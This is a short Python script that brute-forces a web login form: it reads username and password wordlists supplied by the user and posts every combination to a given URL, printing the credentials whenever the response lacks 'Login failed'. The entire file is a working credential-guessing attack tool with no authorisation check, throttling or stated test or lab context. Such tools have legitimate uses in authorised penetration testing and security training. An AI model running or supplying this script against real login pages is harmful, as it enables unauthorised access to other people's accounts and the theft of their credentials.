import requests

# Set the target URL of the login form
url_login = input("Please Enter login URL here: ")  # Get the login URL from user input
login_url = url_login  # Assign the URL directly, no need for curly braces

# Define the path to the files containing usernames and passwords
users_file = input('Please enter the path to your usernames dictionary in Linux: ')
pass_file = input('Please enter the path to your passwords dictionary in Linux: ')
usernames_file = users_file  # Assign directly, no need for f-string here
passwords_file = pass_file  # Assign directly, no need for f-string here


def read_credentials(filename):
    """Reads usernames or passwords from the given file."""
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]


# Read usernames and passwords from files
usernames = read_credentials(usernames_file)
passwords = read_credentials(passwords_file)

# Iterate through each combination of username and password
for username in usernames:
    for password in passwords:
        # Create a session to maintain cookies
        session = requests.Session()

        # Define the login payload with the current username and password
        payload = {
            'username': username,
            'password': password
        }

        # Attempt to login using the current credentials
        response = session.post(login_url, data=payload)

        # Check if login was successful
        if 'Login failed' not in response.text:
            print(f'Successful login with username: {username} and password: {password}')
            # You can add further processing here, such as saving the successful credentials to a file
            break  # Stop attempting other passwords for this username if login was successful
        else:
            print(f'Failed login attempt with username: {username} and password: {password}')

        # Close the session
        session.close()
